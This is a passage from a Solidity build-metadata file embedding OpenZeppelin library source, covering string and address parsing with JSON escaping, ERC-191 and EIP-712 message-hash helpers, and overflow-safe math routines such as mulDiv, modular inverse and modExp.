_tryParseHexUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string-uint256-uint256} that returns false if the parsing fails because of an\\n     * invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseHexUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseHexUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseHexUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // skip 0x prefix if present\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(buffer, begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 offset = hasPrefix.toUint() * 2;\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin + offset; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 15) return (false, 0);\\n            result *= 16;\\n            unchecked {\\n                // Multiplying by 16 is equivalent to a shift of 4 bits (with additional overflow check).\\n                // This guarantees that adding a value < 16 will not cause an overflow, hence the unchecked.\\n                result += chr;\\n            }\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as an `address`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input) internal pure returns (address) {\\n        return parseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input, uint256 begin, uint256 end) internal pure returns (address) {\\n        (bool success, address value) = tryParseAddress(input, begin, end);\\n        if (!success) revert StringsInvalidAddressFormat();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that returns false if the parsing fails because the input is not a properly\\n     * formatted address. See {parseAddress-string} requirements.\\n     */\\n    function tryParseAddress(string memory input) internal pure returns (bool success, address value) {\\n        return tryParseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string-uint256-uint256} that returns false if the parsing fails because input is not a properly\\n     * formatted address. See {parseAddress-string-uint256-uint256} requirements.\\n     */\\n    function tryParseAddress(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, address value) {\\n        if (end > bytes(input).length || begin > end) return (false, address(0));\\n\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(bytes(input), begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 expectedLength = 40 + hasPrefix.toUint() * 2;\\n\\n        // check that input is the correct length\\n        if (end - begin == expectedLength) {\\n            // length guarantees that this does not overflow, and value is at most type(uint160).max\\n            (bool s, uint256 v) = _tryParseHexUintUncheckedBounds(input, begin, end);\\n            return (s, address(uint160(v)));\\n        } else {\\n            return (false, address(0));\\n        }\\n    }\\n\\n    function _tryParseChr(bytes1 chr) private pure returns (uint8) {\\n        uint8 value = uint8(chr);\\n\\n        // Try to parse `chr`:\\n        // - Case 1: [0-9]\\n        // - Case 2: [a-f]\\n        // - Case 3: [A-F]\\n        // - otherwise not supported\\n        unchecked {\\n            if (value > 47 && value < 58) value -= 48;\\n            else if (value > 96 && value < 103) value -= 87;\\n            else if (value > 64 && value < 71) value -= 55;\\n            else return type(uint8).max;\\n        }\\n\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Escape special characters in JSON strings. This can be useful to prevent JSON injection in NFT metadata.\\n     *\\n     * WARNING: This function should only be used in double quoted JSON strings. Single quotes are not escaped.\\n     *\\n     * NOTE: This function escapes all unicode characters, and not just the ones in ranges defined in section 2.5 of\\n     * RFC-4627 (U+0000 to U+001F, U+0022 and U+005C). ECMAScript's `JSON.parse` does recover escaped unicode\\n     * characters that are not in this range, but other tooling may provide different results.\\n     */\\n    function escapeJSON(string memory input) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(input);\\n        bytes memory output = new bytes(2 * buffer.length); // worst case scenario\\n        uint256 outputLength = 0;\\n\\n        for (uint256 i; i < buffer.length; ++i) {\\n            bytes1 char = bytes1(_unsafeReadBytesOffset(buffer, i));\\n            if (((SPECIAL_CHARS_LOOKUP & (1 << uint8(char))) != 0)) {\\n                output[outputLength++] = \\\"\\\\\\\\\\\";\\n                if (char == 0x08) output[outputLength++] = \\\"b\\\";\\n                else if (char == 0x09) output[outputLength++] = \\\"t\\\";\\n                else if (char == 0x0a) output[outputLength++] = \\\"n\\\";\\n                else if (char == 0x0c) output[outputLength++] = \\\"f\\\";\\n                else if (char == 0x0d) output[outputLength++] = \\\"r\\\";\\n                else if (char == 0x5c) output[outputLength++] = \\\"\\\\\\\\\\\";\\n                else if (char == 0x22) {\\n                    // solhint-disable-next-line quotes\\n                    output[outputLength++] = '\\\"';\\n                }\\n            } else {\\n                output[outputLength++] = char;\\n            }\\n        }\\n        // write the actual length and deallocate unused memory\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(output, outputLength)\\n            mstore(0x40, add(output, shl(5, shr(5, add(outputLength, 63)))))\\n        }\\n\\n        return string(output);\\n    }\\n\\n    /**\\n     * @dev Reads a bytes32 from a bytes array without bounds checking.\\n     *\\n     * NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\\n     * assembly block as such would prevent some optimizations.\\n     */\\n    function _unsafeReadBytesOffset(bytes memory buffer, uint256 offset) private pure returns (bytes32 value) {\\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\\n        assembly (\\\"memory-safe\\\") {\\n            value := mload(add(add(buffer, 0x20), offset))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xad148d59f05165f9217d0a9e1ac8f772abb02ea6aaad8a756315c532bf79f9f4\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/cryptography/MessageHashUtils.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Strings} from \\\"../Strings.sol\\\";\\n\\n/**\\n * @dev Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing.\\n *\\n * The library provides methods for generating a hash of a message that conforms to the\\n * https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712]\\n * specifications.\\n */\\nlibrary MessageHashUtils {\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x45` (`personal_sign` messages).\\n     *\\n     * The digest is calculated by prefixing a bytes32 `messageHash` with\\n     * `\\\"\\\\x19Ethereum Signed Message:\\\\n32\\\"` and hashing the result. It corresponds with the\\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\\n     *\\n     * NOTE: The `messageHash` parameter is intended to be the result of hashing a raw message with\\n     * keccak256, although any bytes32 value can be safely used because the final digest will\\n     * be re-hashed.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, \\\"\\\\x19Ethereum Signed Message:\\\\n32\\\") // 32 is the bytes-length of messageHash\\n            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix\\n            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x45` (`personal_sign` messages).\\n     *\\n     * The digest is calculated by prefixing an arbitrary `message` with\\n     * `\\\"\\\\x19Ethereum Signed Message:\\\\n\\\" + len(message)` and hashing the result. It corresponds with the\\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {\\n        return\\n            keccak256(bytes.concat(\\\"\\\\x19Ethereum Signed Message:\\\\n\\\", bytes(Strings.toString(message.length)), message));\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x00` (data with intended validator).\\n     *\\n     * The digest is calculated by prefixing an arbitrary `data` with `\\\"\\\\x19\\\\x00\\\"` and the intended\\n     * `validator` address. Then hashing the result.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {\\n        return keccak256(abi.encodePacked(hex\\\"19_00\\\", validator, data));\\n    }\\n\\n    /**\\n     * @dev Variant of {toDataWithIntendedValidatorHash-address-bytes} optimized for cases where `data` is a bytes32.\\n     */\\n    function toDataWithIntendedValidatorHash(\\n        address validator,\\n        bytes32 messageHash\\n    ) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, hex\\\"19_00\\\")\\n            mstore(0x02, shl(96, validator))\\n            mstore(0x16, messageHash)\\n            digest := keccak256(0x00, 0x36)\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an EIP-712 typed data (ERC-191 version `0x01`).\\n     *\\n     * The digest is calculated from a `domainSeparator` and a `structHash`, by prefixing them with\\n     * `\\\\x19\\\\x01` and hashing the result. It corresponds to the hash signed by the\\n     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`] JSON-RPC method as part of EIP-712.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            mstore(ptr, hex\\\"19_01\\\")\\n            mstore(add(ptr, 0x02), domainSeparator)\\n            mstore(add(ptr, 0x22), structHash)\\n            digest := keccak256(ptr, 0x42)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x26670fef37d4adf55570ba78815eec5f31cb017e708f61886add4fc4da665631\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Panic} from \\\"../Panic.sol\\\";\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit addition of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that sum = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        assembly (\\\"memory-safe\\\") {\\n            low := add(a, b)\\n            high := lt(low, a)\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit multiplication of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        // 512-bit multiply [high low] = x * y. Compute the product mod 2\\u00b2\\u2075\\u2076 and mod 2\\u00b2\\u2075\\u2076 - 1, then use\\n        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n        // variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n        assembly (\\\"memory-safe\\\") {\\n            let mm := mulmod(a, b, not(0))\\n            low := mul(a, b)\\n            high := sub(sub(mm, low), lt(mm, low))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a + b;\\n            success = c >= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a - b;\\n            success = c <= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a * b;\\n            assembly (\\\"memory-safe\\\") {\\n                // Only true when the multiplication doesn't overflow\\n                // (c / a == b) || (a == 0)\\n                success := or(eq(div(c, a), b), iszero(a))\\n            }\\n            // equivalent to: success ? c : 0\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `DIV` opcode returns zero when the denominator is 0.\\n                result := div(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `MOD` opcode returns zero when the denominator is 0.\\n                result := mod(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating addition, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryAdd(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.\\n     */\\n    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (, uint256 result) = trySub(a, b);\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating multiplication, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryMul(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * SafeCast.toUint(condition));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n\\n        // The following calculation ensures accurate ceiling division without overflow.\\n        // Since a is non-zero, (a - 1) / b will not overflow.\\n        // The largest possible result occurs when (a - 1) / b is type(uint256).max,\\n        // but the largest value we can obtain is type(uint256).max - 1, which happens\\n        // when a = type(uint256).max and b = 1.\\n        unchecked {\\n            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     *\\n     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (high == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return low / denominator;\\n            }\\n\\n            // Make sure the result is less than 2\\u00b2\\u2075\\u2076. Also prevents denominator == 0.\\n            if (denominator <= high) {\\n                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [high low].\\n            uint256 remainder;\\n            assembly (\\\"memory-safe\\\") {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                high := sub(high, gt(remainder, low))\\n                low := sub(low, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly (\\\"memory-safe\\\") {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [high low] by twos.\\n                low := div(low, twos)\\n\\n                // Flip twos such that it is 2\\u00b2\\u2075\\u2076 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from high into low.\\n            low |= high * twos;\\n\\n            // Invert denominator mod 2\\u00b2\\u2075\\u2076. Now that denominator is an odd number, it has an inverse modulo 2\\u00b2\\u2075\\u2076 such\\n            // that denominator * inv \\u2261 1 mod 2\\u00b2\\u2075\\u2076. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv \\u2261 1 mod 2\\u2074.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u2076\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b3\\u00b2\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2076\\u2074\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u00b2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b2\\u2075\\u2076\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2\\u00b2\\u2075\\u2076. Since the preconditions guarantee that the outcome is\\n            // less than 2\\u00b2\\u2075\\u2076, this is the final result. We don't need to compute the high bits of the result and high\\n            // is no longer required.\\n            result = low * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n            if (high >= 1 << n) {\\n                Panic.panic(Panic.UNDER_OVERFLOW);\\n            }\\n            return (high << (256 - n)) | (low >> n);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {\\n        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\\n     *\\n     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\\n     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\\n     *\\n     * If the input value is not inversible, 0 is returned.\\n     *\\n     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\\n     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.\\n     */\\n    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {\\n        unchecked {\\n            if (n == 0) return 0;\\n\\n            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)\\n            // Used to compute integers x and y such that: ax + ny = gcd(a, n).\\n            // When the gcd is 1, then the inverse of a modulo n exists and it's x.\\n            // ax + ny = 1\\n            // ax = 1 + (-y)n\\n            // ax \\u2261 1 (mod n) # x is the inverse of a modulo n\\n\\n            // If the remainder is 0 the gcd is n right away.\\n            uint256 remainder = a % n;\\n            uint256 gcd = n;\\n\\n            // Therefore the initial coefficients are:\\n            // ax + ny = gcd(a, n) = n\\n            // 0a + 1n = n\\n            int256 x = 0;\\n            int256 y = 1;\\n\\n            while (remainder != 0) {\\n                uint256 quotient = gcd / remainder;\\n\\n                (gcd, remainder) = (\\n                    // The old remainder is the next gcd to try.\\n                    remainder,\\n                    // Compute the next remainder.\\n                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd\\n                    // where gcd is at most n (capped to type(uint256).max)\\n                    gcd - remainder * quotient\\n                );\\n\\n                (x, y) = (\\n                    // Increment the coefficient of a.\\n                    y,\\n                    // Decrement the coefficient of n.\\n                    // Can overflow, but the result is casted to uint256 so that the\\n                    // next value of y is \\\"wrapped around\\\" to a value between 0 and n - 1.\\n                    x - y * int256(quotient)\\n                );\\n            }\\n\\n            if (gcd != 1) return 0; // No inverse exists.\\n            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\\n     *\\n     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\\n     * prime, then `a**(p-1) \\u2261 1 mod p`. As a consequence, we have `a * a**(p-2) \\u2261 1 mod p`, which means that\\n     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.\\n     *\\n     * NOTE: this function does NOT check that `p` is a prime greater than `2`.\\n     */\\n    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {\\n        unchecked {\\n            return Math.modExp(a, p - 2, p);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\\n     *\\n     * Requirements:\\n     * - modulus can't be zero\\n     * - underlying staticcall to precompile must succeed\\n     *\\n     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\\n     * sure the chain you're using it on supports the precompiled contract for modular exponentiation\\n     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\\n     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly\\n     * interpreted as 0.\\n     */\\n    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {\\n        (bool success, uint256 result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\\n     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\\n     * to operate modulo 0 or if the underlying precompile reverted.\\n     *\\n     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\\n     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\\n     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\\n     * of a revert, but the result may be incorrectly interpreted as 0.\\n     */\\n    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {\\n        if (m == 0) return (false, 0);\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            // | Offset    | Content    | Content (Hex)                                                      |\\n            // |-----------|------------|--------------------------------------------------------------------|\\n            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x60:0x7f | value of b | 0x<.............................................................b> |\\n            // | 0x80:0x9f | value of e | 0x<.............................................................e> |\\n            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |\\n            mstore(ptr, 0x20)\\n            mstore(add(ptr, 0x20), 0x20)\\n            mstore(add(ptr, 0x40), 0x20)\\n            mstore(add(ptr, 0x60), b)\\n            mstore(add(ptr, 0x80), e)\\n            mstore(add(ptr, 0xa0), m)\\n\\n            // Given the result < m, it's guaranteed to fit in 32 bytes,\\n            // so we can use the memory scratch space located at offset 0.\\n            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)\\n            result := mload(0x00)\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {modExp} that supports inputs of arbitrary length.\\n     */\\n    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {\\n        (bool success, bytes memory result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.\\n     */\\n    function tryModExp(\\n        bytes memory b,\\n        bytes memory e,\\n        bytes memory m\\n    ) internal view returns (bool success, bytes memory result) {\\n        if (_zeroBytes(m)) return (false, new bytes(0));\\n\\n        uint256 mLen = m.length;\\n\\n        // Encode call args in result and move the free memory pointer\\n        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);\\n\\n        assembly (\\\"memory-safe\\\") {\\n            let dataPtr := add(result, 0x20)\\n            // Write result on top of args to avoid allocating extra memory.\\n            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)\\n            // Overwrite the length.\\n            // result.length > returndatasize() is guaranteed because returndatasize() == m.length\\n            mstore(result, mLen)\\n            // Set the memory pointer after the returned data.\\n            mstore(0x40, add(dataPtr, mLen))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether the provided byte array is zero.\\n     */\\n    function _zeroBytes(bytes memory byteArray) private pure returns (bool) {\\n        for (uint256 i = 0; i < byteArray.length; ++i) {\\n            if (byteArray[i] != 0) {\\n                return false;\\n            }\\n        }\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only\\n     * using integer operations.\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        unchecked {\\n            // Take care of easy edge cases when a == 0 or a == 1\\n            if (a <= 1) {\\n                return a;\\n            }\\n\\n            // In this function, we use Newton's method to get a root of `f(x) := x\\u00b2 - a`. It involves building a\\n            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between\\n            // the current value as `\\u03b5_n = | x_n - sqrt(a) |`.\\n            //\\n            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root\\n            // of the target. (i.e. `2**(e-1) \\u2264 sqrt(a) < 2**e`). We know that `e \\u2264 128` because `(2\\u00b9\\u00b2\\u2078)\\u00b2 = 2\\u00b2\\u2075\\u2076` is\\n            // bigger than any uint256.\\n            //\\n            // By noticing that\\n            // `2**(e-1) \\u2264 sqrt(a) < 2**e \\u2192 (2**(e-1))\\u00b2 \\u2264 a < (2**e)\\u00b2 \\u2192 2**(2*e-2) \\u2264 a < 2**(2*e)`\\n            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar\\n            // to the msb function.\\n            uint256 aa = a;\\n     